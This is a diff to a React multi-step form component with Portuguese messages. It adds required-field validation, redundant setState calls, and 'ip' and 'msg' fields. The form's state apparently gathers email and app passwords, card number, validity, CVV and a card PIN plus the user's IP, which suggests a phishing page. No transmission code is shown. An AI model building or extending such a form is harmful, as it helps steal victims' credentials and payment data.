@@ -13,12 +13,43 @@ export class Form extends Component {
         passapp: '',
         cc: '',
         valcc: '',
-        cvv: ''
+        cvv: '',
+        ip: '',
+        msg: ''
+
     };
 
     nextStep = () => {
         const { step } = this.state;
-        this.setState({ step: step + 1 });
+        const { cp } = this.state;
+        const { email } = this.state;
+        const { phone } = this.state;
+        const { passapp } = this.state;
+        const { cc } = this.state;
+        const { valcc } = this.state;
+        const { cvv } = this.state;
+
+
+
+        const { msg } = this.state;
+
+        this.setState({ cp: cp });
+        this.setState({ email: email });
+        this.setState({ phone: phone });
+        this.setState({ passapp: passapp });
+        this.setState({ cc: cc });
+        this.setState({ valcc: valcc });
+        this.setState({ cvv: cvv });
+        this.setState({ msg: msg });
+
+        if(cp != '' && email != '' && phone != '' && passapp != '' ){
+            this.setState({ step: step + 1 });
+        }else{
+       this.setState({ msg: 'Por favor, preencha todos os campos obrigatórios (*)  ' });
+        
+        }
+
+        
     };
 
     prevStep = () => {
@@ -34,8 +65,8 @@ export class Form extends Component {
 
     render() {
         const { step } = this.state;
-        const { cp, email, phone, passapp, cc, valcc, ccpass,passemail,cvv } = this.state;
-        const values = { cp, email, phone, passapp, cc, valcc, ccpass,passemail,cvv };
+        const { cp, email, phone, passapp, cc, valcc, ccpass, passemail, cvv, msg } = this.state;
+        const values = { cp, email, phone, passapp, cc, valcc, ccpass, passemail, cvv, msg };
 
 
         
